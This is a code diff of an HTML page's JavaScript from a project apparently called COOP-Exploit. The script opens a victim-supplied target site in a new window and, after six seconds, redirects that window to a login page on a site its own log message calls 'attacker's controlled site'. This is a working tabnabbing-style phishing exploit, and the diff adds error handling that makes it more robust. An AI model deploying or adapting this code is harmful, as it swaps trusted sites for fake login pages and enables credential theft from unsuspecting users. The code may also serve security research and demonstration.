@@ -44,6 +44,8 @@
         }
     </style>
     <script type="text/javascript">
+        let foo; // Declare globally
+        
         function tParam(qParam) {
             const frmURL = window.location.search.substring(1);
             const varURL = frmURL.split('&');
@@ -53,35 +55,44 @@
                     return decodeURIComponent(vParam[1]);
                 }
             }
+            console.warn("Target parameter missing. Redirecting...");
             window.location.href = "https://sp3ttr0.github.io/COOP-Exploit/";
+            return null;
         }
 
         function init() {
-            console.log("Redirecting to attacker's controlled site");
-            foo.location.href = "https://sp3ttr0.github.io/COOP-Exploit/login.html";
+            if (foo) {
+                console.log("Redirecting to attacker's controlled site");
+                foo.location.href = "https://sp3ttr0.github.io/COOP-Exploit/login.html";
+            } else {
+                console.error("Window object not found, redirection failed.");
+            }
         }
 
         function launch() {
             const target = tParam("target");
-            foo = window.open(target, "foo", "");
-            console.log("Target site opened successfully");
-            setTimeout(init, 6000);
+            if (!target) return; // Prevent errors if target is null
+            foo = window.open(target, "_blank"); // Ensure correct reference
+            if (foo) {
+                console.log("Target site opened successfully:", target);
+                setTimeout(init, 6000);
+            } else {
+                console.error("Popup blocked or failed to open.");
+            }
         }
-
+        
         function setup() {
             const target = tParam("target");
+            if (!target) return; // Prevent errors if target is null
             document.body.addEventListener('click', launch);
-            const message = document.getElementById('message');
-            message.innerText = `Redirecting to ${target}... If the site did not automatically redirect to ${target}, click anywhere in the white background.`;
+            const message = document.createElement('div');
+            message.id = 'message';
+            message.innerText = `If the site did not automatically redirect to ${target}, click anywhere in the white background`;
+            document.body.appendChild(message);
             launch();
         }
-
-        window.onload = function () {
-            setup();
-            setTimeout(() => {
-                location.reload();
-            }, 5000);
-        };
+        
+        window.onload = setup;
     </script>
 </head>
 <body>
